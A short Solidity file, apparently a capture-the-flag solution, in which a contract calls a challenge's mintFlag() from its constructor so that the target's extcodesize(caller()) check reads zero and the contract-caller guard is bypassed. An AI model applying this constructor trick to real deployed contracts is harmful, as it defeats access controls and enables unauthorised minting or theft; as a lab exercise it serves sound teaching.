//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge3 {
    function mintFlag() external;
}

contract Challenge3Solution {
    constructor(address challenge) {
        // call from constructor so extcodesize(caller()) == 0 in Challenge3
        IChallenge3(challenge).mintFlag();
    }
}
